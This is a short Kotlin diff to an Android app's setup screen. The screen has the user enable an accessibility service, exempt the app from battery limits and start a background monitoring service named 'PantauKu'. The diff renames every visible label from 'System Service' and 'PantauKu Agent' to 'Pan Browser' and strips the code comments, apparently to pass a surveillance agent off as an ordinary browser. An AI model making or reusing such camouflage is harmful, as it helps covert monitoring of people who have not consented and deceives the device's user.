@@ -16,7 +16,7 @@ class SetupActivity : AppCompatActivity() {
 
         findViewById<Button>(R.id.btnAccessibility).setOnClickListener {
             startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
-            Toast.makeText(this, "Cari \"System Service\" lalu aktifkan", Toast.LENGTH_LONG).show()
+            Toast.makeText(this, "Cari \"Pan Browser\" lalu aktifkan", Toast.LENGTH_LONG).show()
         }
 
         findViewById<Button>(R.id.btnBattery).setOnClickListener {
@@ -26,13 +26,11 @@ class SetupActivity : AppCompatActivity() {
             try {
                 startActivity(intent)
             } catch (e: Exception) {
-                // Fallback: open battery settings
                 startActivity(Intent(Settings.ACTION_BATTERY_SAVER_SETTINGS))
             }
         }
 
         findViewById<Button>(R.id.btnStart).setOnClickListener {
-            // Start the foreground service
             val serviceIntent = Intent(this, PantauKuService::class.java)
             if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                 startForegroundService(serviceIntent)
@@ -40,11 +38,11 @@ class SetupActivity : AppCompatActivity() {
                 startService(serviceIntent)
             }
             EventQueue.init(applicationContext)
-            Toast.makeText(this, "Layanan berjalan", Toast.LENGTH_SHORT).show()
+            Toast.makeText(this, "Pan Browser siap digunakan", Toast.LENGTH_SHORT).show()
             finish()
         }
 
         val statusText = findViewById<TextView>(R.id.tvStatus)
-        statusText.text = "PantauKu Agent v1.0\nSiap diaktifkan"
+        statusText.text = "Pan Browser v1.0\nSiap digunakan"
     }
 }
